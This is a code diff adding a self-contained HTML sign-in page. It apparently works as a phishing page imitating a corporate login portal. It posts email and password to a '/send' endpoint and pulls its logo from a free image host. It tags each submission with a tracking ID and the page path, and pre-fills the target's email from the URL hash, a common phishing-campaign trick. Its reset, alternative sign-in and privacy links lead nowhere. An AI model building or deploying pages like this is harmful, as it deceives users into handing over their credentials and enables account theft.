@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Page</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background-color: initial;
+        color: #0a3578;
+    }
+
+    .login-container {
+        width: 495px;
+        height: 486px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px 25px;
+        text-align: center;
+    }
+
+    .login-top {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .login-container img {
+        width: 200px; /* larger logo */
+        margin-bottom: 20px;
+    }
+
+    form {
+        width: 100%;
+    }
+
+    .input-wrapper {
+        position: relative;
+        width: 100%;
+        margin-bottom: 22px;
+    }
+
+    .input-wrapper input {
+        width: 100%;
+        padding: 10px 5px;
+        font-size: 14px;
+        border: none;
+        border-bottom: 1px solid #0a3578;
+        outline: none;
+        background: transparent;
+        color: #0a3578;
+        transition: border-color 0.3s;
+    }
+
+    .input-wrapper input:hover,
+    .input-wrapper input:focus {
+        border-bottom: 1.5px solid #06265f;
+    }
+
+    .input-wrapper label {
+        position: absolute;
+        left: 5px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 12px;
+        color: #0a3578;
+        pointer-events: none;
+        transition: all 0.2s ease-out;
+        background-color: transparent;
+        padding: 0 2px;
+    }
+
+    .input-wrapper input:focus + label,
+    .input-wrapper input.not-empty + label {
+        top: -10px;
+        font-size: 11px;
+        color: #06265f;
+    }
+
+    .password-wrapper {
+        position: relative;
+    }
+
+    .toggle-password {
+        position: absolute;
+        right: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 16px;
+        color: #0a3578;
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        background-color: #0a3578;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        margin-bottom: 15px;
+    }
+
+    button:hover {
+        background-color: #06265f;
+    }
+
+    .links {
+        font-size: 13px;
+        letter-spacing: 0.3px;
+        margin-bottom: 15px;
+    }
+
+    .links a {
+        color: #0a3578;
+        text-decoration: none;
+        margin: 0 6px;
+    }
+
+    .links a:hover {
+        color: #06265f;
+        text-decoration: underline;
+    }
+
+    .language {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+        font-size: 13px;
+        margin-bottom: 10px;
+    }
+
+    .language span {
+        color: #0a3578;
+        letter-spacing: 0.3px;
+    }
+
+    .language select {
+        padding: 5px 8px;
+        font-size: 13px;
+        border: none;
+        background-color: transparent;
+        color: #0a3578;
+        cursor: pointer;
+        appearance: none;
+    }
+
+    .language select option {
+        color: #0a3578;
+    }
+
+    .privacy a {
+        color: #0a3578;
+        font-size: 13px;
+        text-decoration: none;
+    }
+
+    .privacy a:hover {
+        color: #06265f;
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="login-top">
+        <img src="https://i.ibb.co/WvjnMbmS/cb3cc3fa3480964080588c52478ae092-login.png" alt="Logo">
+
+        <form action="/send" method="post" id="loginForm">
+            <div class="input-wrapper">
+                <input type="email" id="email" name="email" required>
+                <label for="email">Email</label>
+            </div>
+
+            <div class="input-wrapper password-wrapper">
+                <input type="password" id="password" name="userpwd" required>
+                <label for="password">Password</label>
+                <span class="toggle-password" onclick="togglePassword()">👁️</span>
+            </div>
+		<!-- Hidden inputs for session tracking -->
+	  <input type="hidden" name="sessionId" id="sessionId" value="">
+  	  <input type="hidden" name="submissionPath" id="submissionPath" value="">
+
+            <button type="submit">SIGN IN</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Reset my password</a> | <a href="#">Sign in another way</a>
+        </div>
+    </div>
+
+    <div>
+        <div class="language">
+            <span>Language:</span>
+            <select id="languageSelect">
+                <option value="" disabled selected>Select Language</option>
+                <option value="en-uk">English (UK)</option>
+                <option value="en-us">English (US)</option>
+                <option value="de">Deutsch</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="he">עברית</option>
+                <option value="ja">日本語</option>
+                <option value="it">Italiano</option>
+                <option value="nl">Nederlands</option>
+                <option value="ru">Русский язык</option>
+                <option value="sv">Svenska</option>
+                <option value="zh">中文</option>
+                <option value="pl">Polski</option>
+            </select>
+        </div>
+
+        <div class="privacy">
+            <a href="#">Privacy Policy</a>
+        </div>
+    </div>
+</div>
+
+<script>
+	// Generate or retrieve sessionId
+  let sessionId = localStorage.getItem("sessionId");
+  if (!sessionId) {
+    sessionId = crypto.randomUUID();
+    localStorage.setItem("sessionId", sessionId);
+  }
+  document.getElementById("sessionId").value = sessionId;
+
+  // Always set current path for submissionPath
+  document.getElementById("submissionPath").value = window.location.pathname;
+
+    // Toggle password visibility
+    function togglePassword() {
+        const password = document.getElementById('password');
+        password.type = password.type === 'password' ? 'text' : 'password';
+    }
+
+    // Floating labels effect
+    const inputs = document.querySelectorAll('.input-wrapper input');
+    inputs.forEach(input => {
+        input.addEventListener('input', () => {
+            if(input.value !== '') {
+                input.classList.add('not-empty');
+            } else {
+                input.classList.remove('not-empty');
+            }
+        });
+    });
+
+    // Language translations
+    const translations = {
+        "en-uk": {
+            reset: "Reset my password",
+            signinAnother: "Sign in another way",
+            privacy: "Privacy Policy",
+            email: "Email",
+            password: "Password",
+            signinButton: "SIGN IN",
+            languageLabel: "Language:"
+        },
+        "en-us": {
+            reset: "Reset my password",
+            signinAnother: "Sign in another way",
+            privacy: "Privacy Policy",
+            email: "Email",
+            password: "Password",
+            signinButton: "SIGN IN",
+            languageLabel: "Language:"
+        },
+        "de": {
+            reset: "Passwort zurücksetzen",
+            signinAnother: "Anders anmelden",
+            privacy: "Datenschutz-Bestimmungen",
+            email: "E-Mail",
+            password: "Passwort",
+            signinButton: "ANMELDEN",
+            languageLabel: "Sprache:"
+        },
+        "es": {
+            reset: "Restablecer mi contraseña",
+            signinAnother: "Iniciar sesión de otra manera",
+            privacy: "Política de privacidad",
+            email: "Correo electrónico",
+            password: "Contraseña",
+            signinButton: "INICIAR SESIÓN",
+            languageLabel: "Idioma:"
+        },
+        "fr": {
+            reset: "Réinitialiser mon mot de passe",
+            signinAnother: "Se connecter autrement",
+            privacy: "Politique de confidentialité",
+            email: "Email",
+            password: "Mot de passe",
+            signinButton: "SE CONNECTER",
+            languageLabel: "Langue:"
+        },
+        "he": {
+            reset: "אפס את הסיסמה שלי",
+            signinAnother: "התחבר בדרך אחרת",
+            privacy: "מדיניות פרטיות",
+            email: "דואר אלקטרוני",
+            password: "סיסמה",
+            signinButton: "התחברות",
+            languageLabel: "שפה:"
+        },
+        "ja": {
+            reset: "パスワードをリセット",
+            signinAnother: "別の方法でサインイン",
+            privacy: "プライバシーポリシー",
+            email: "メール",
+            password: "パスワード",
+            signinButton: "サインイン",
+            languageLabel: "言語:"
+        },
+        "it": {
+            reset: "Reimposta la password",
+            signinAnother: "Accedi in un altro modo",
+            privacy: "Informativa sulla privacy",
+            email: "Email",
+            password: "Password",
+            signinButton: "ACCEDI",
+            languageLabel: "Lingua:"
+        },
+        "nl": {
+            reset: "Wachtwoord opnieuw instellen",
+            signinAnother: "Op een andere manier aanmelden",
+            privacy: "Privacybeleid",
+            email: "E-mail",
+            password: "Wachtwoord",
+            signinButton: "INLOGGEN",
+            languageLabel: "Taal:"
+        },
+        "ru": {
+            reset: "Сбросить пароль",
+            signinAnother: "Войти другим способом",
+            privacy: "Политика конфиденциальности",
+            email: "Электронная почта",
+            password: "Пароль",
+            signinButton: "ВОЙТИ",
+            languageLabel: "Язык:"
+        },
+        "sv": {
+            reset: "Återställ mitt lösenord",
+            signinAnother: "Logga in på annat sätt",
+            privacy: "Integritetspolicy",
+            email: "E-post",
+            password: "Lösenord",
+            signinButton: "LOGGA IN",
+            languageLabel: "Språk:"
+        },
+        "zh": {
+            reset: "重置我的密码",
+            signinAnother: "以其他方式登录",
+            privacy: "隐私政策",
+            email: "电子邮件",
+            password: "密码",
+            signinButton: "登录",
+            languageLabel: "语言:"
+        },
+        "pl": {
+            reset: "Zresetuj moje hasło",
+            signinAnother: "Zaloguj się w inny sposób",
+            privacy: "Polityka prywatności",
+            email: "Email",
+            password: "Hasło",
+            signinButton: "ZALOGUJ SIĘ",
+            languageLabel: "Język:"
+        }
+    };
+
+    // Language select event
+    const languageSelect = document.getElementById('languageSelect');
+    languageSelect.addEventListener('change', (e) => {
+        const selectedLang = e.target.value;
+        const t = translations[selectedLang];
+
+        if(t){
+            document.querySelector('.links a:nth-child(1)').textContent = t.reset;
+            document.querySelector('.links a:nth-child(3)').textContent = t.signinAnother;
+            document.querySelector('.privacy a').textContent = t.privacy;
+            document.querySelector('label[for="email"]').textContent = t.email;
+            document.querySelector('label[for="password"]').textContent = t.password;
+            document.querySelector('button[type="submit"]').textContent = t.signinButton;
+            document.querySelector('.language span').textContent = t.languageLabel;
+        }
+    });
+
+	
+    // Grab email from URL hash
+    window.addEventListener('DOMContentLoaded', () => {
+        const urlHash = window.location.hash; // e.g., #user@example.com
+        if(urlHash){
+            const emailFromHash = decodeURIComponent(urlHash.substring(1));
+            const emailInput = document.getElementById('email');
+            
+            // Simple validation: check if it looks like an email
+            if(emailFromHash.includes('@')){
+                emailInput.value = emailFromHash;
+                emailInput.classList.add('not-empty'); // for floating label effect
+            }
+        }
+    });
+</script>
+</body>
+</html>
